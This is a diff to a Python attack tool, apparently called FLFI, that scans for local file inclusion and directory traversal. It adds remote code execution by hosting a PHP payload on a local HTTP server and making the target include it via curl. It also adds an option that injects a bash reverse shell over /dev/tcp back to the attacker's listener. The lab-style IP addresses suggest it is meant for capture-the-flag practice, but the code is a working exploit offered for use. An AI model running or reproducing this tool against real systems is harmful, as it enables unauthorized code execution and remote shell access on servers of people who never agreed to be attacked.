@@ -10,8 +10,9 @@ import socketserver
 import subprocess
 import sys
 import threading
+from time import sleep
 
-version = "0.0.1"
+version = "0.1.0"
 
 # This little class cause the help  text to display if no params are given.
 class MyParser(argparse.ArgumentParser):
@@ -71,13 +72,19 @@ parser.add_argument('-o', '--print', dest="print_file", required=False, action='
 #     help="Attempts to exploit apache2-4-49/50 CVE-2021-41773/42013")
 
 parser.add_argument('--RCE', dest="rce", required=False, action='store_true',
-    help="Will attempt RCE on target. Default is command is 'whoami'")
+    help="Will attempt RCE on target. Default is command is echo Hello FLFI!")
 
-parser.add_argument('-i', '--ip', dest="host_ip", required=False, type=str, \
+parser.add_argument('--RCE-basic-shell', dest="basic_shell", required=False, action='store_true',
+    help="Execute basic reverse shell, MAKE SURE to start a listener on the same port you specified in --lport")
+
+parser.add_argument('--lhost', dest="lhost", required=False, type=str, \
     help="Set the local host for RCE")
 
-parser.add_argument('-p', '--port', dest="port", required=False, type=str, \
+parser.add_argument('--lport', dest="lport", required=False, type=str, \
     help="Port for reverse shell")
+
+parser.add_argument('--rport', dest="rport", required=False, type=str, \
+    help="Port Target will use to connect to the local listener for shell.")
 
 # Parse Args put new args ^^ above here! lol 
 args = parser.parse_args()
@@ -115,16 +122,27 @@ class FLFI:
         self.singular_search_file = args.search_file
         self.singular_search_check = args.check_str
         self.print_file = args.print_file
+        self.lhost = args.lhost 
+        self.lport = args.lport
+        self.rport = args.rport
         self.rce = args.rce
-        self.host_ip = args.host_ip 
-        self.port = args.port
+        self.basic_shell = args.basic_shell
         self.max_depth=args.max_depth
         self.url = self.clean_url(args.url)
+        
         
         # More VARs
         self.vuln_urls = []
         self.folders_to_check = ['/']
         self.http_methods = ['GET']
+
+        if self.rce or (self.lhost and self.lport):
+            self.rce = True
+            self.http_methods = ['RCE']
+
+        if (self.lhost and not self.lport) or (self.lport and not self.lhost):
+            print("For RCE you must provide both LHOST and LPORT")
+            sys.exit()
         
         if args.use_post_only:
             self.http_methods = ['POST']
@@ -153,10 +171,10 @@ class FLFI:
         self.curr_null_byte = ""
         self.curr_http_method = ""
         self.curr_post_param = ""
-
+        self.curr_folder = ""
+        
         self.prev_len = 0
         self.curr_len = 0
-        self.curr_folder = 0
         self.curr_interation = 0
 
         # Some helpful checks
@@ -170,16 +188,23 @@ class FLFI:
                 print("To use the POST method you must provide a param using --param-data or include it in your url. For Example: 10.10.218.27/lab6.php?file=")
         if not self.max_depth:
             self.max_depth = 12
-        if self.rce and not self.host_ip:
-            print("!! If RCE is set local host (-i or --ip) needs to be set.")
-            quit()
+        if self.rce and not self.lhost:
+            print("!! If RCE is set, LHOST needs to be set.")
+            sys.exit()
         if self.singular_search_file and not self.singular_search_check:
             print("You privide both a search file: -f and a search check: -c if you want to search for a specific file")
-            quit()
+            sys.exit()
         if self.singular_search_file and self.singular_search_check:
             self.common_files = [ {
                 "name": self.singular_search_file,
                 "checks": [self.singular_search_check],}]
+        #self.rce_code = "<?php print exec('');?>"
+        if self.rce:
+            self.rce_code = "<?php print exec(\"echo 'Hello flfi!'\"); ?>"
+        if self.basic_shell:
+            ip = self.lhost + '/' + self.rport
+            self.rce_code = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/""" + ip + """ 0>&1'"); ?>"""
+        
 
     # ---> REAL FUNCTIONS START HERE:
 
@@ -204,9 +229,12 @@ class FLFI:
     def construct_url(self):
         if self.param_data:
             param = "?" + self.param_data + "="
-        else: 
+        else:  
             param = ""
-        url = (self.url + param + '/' + self.curr_folder).replace('//','/') + (self.curr_trav_str * self.curr_interation) + \
+        if self.rce:
+            url = (self.url + param).replace('//','/')
+        else:
+            url = (self.url + param + '/' + self.curr_folder).replace('//','/') + (self.curr_trav_str * self.curr_interation) + \
             self.curr_file[1:] + self.curr_null_byte
         self.prev_len = self.curr_len
         self.curr_len = len(url + (" " * 25))
@@ -321,7 +349,7 @@ class FLFI:
                     if self.print_file:
                         print(r)
                     break
-        quit()
+        sys.exit()
     
     def check_all_files_curl_post(self):
         for f in self.common_files:
@@ -337,7 +365,7 @@ class FLFI:
                     if self.print_file:
                         print(r)
                     break
-        quit()
+        sys.exit()
     
     def check_all_files_curl_cookie(self):
         for f in self.common_files:
@@ -353,7 +381,34 @@ class FLFI:
                     if self.print_file:
                         print(r)
                     break
-        quit()
+        sys.exit()
+
+    def start_http_server(self):
+        handler = http.server.SimpleHTTPRequestHandler
+        with socketserver.TCPServer(("", int(self.lport)), handler) as httpd:
+            print("Server started at localhost:" + str(self.lport))
+            httpd.serve_forever()
+
+
+    def try_rce(self):
+        print("\n---> ATTEMPTING RCE <---\n") 
+        t1 = threading.Thread(target=self.start_http_server, daemon=True).start()
+        sleep(3)
+        with open('cmd.txt', 'w') as f:
+            f.truncate(0)
+            f.write(self.rce_code)
+        self.curr_url = self.construct_url()
+        #print("curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
+        r=subprocess.getoutput("curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
+        if "Hello flfi" in r:
+            print("--------------------------------------------------")
+            print("[+] EXECUTED cmd.txt " + self.rce_code + "\n")
+            print("[+] USE curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
+            print("--------------------------------------------------\n")
+            if self.print_file:
+                print(r)
+        
+        sys.exit()
 
 
 lfi= FLFI(args)
@@ -371,4 +426,7 @@ for f in lfi.common_files:
         answer = lfi.dir_trav_curl_cookie(f)
         if answer != "I got nothing":
             lfi.check_all_files_curl_cookie()
+    if 'RCE' in lfi.http_methods:
+        lfi.try_rce()
+
     
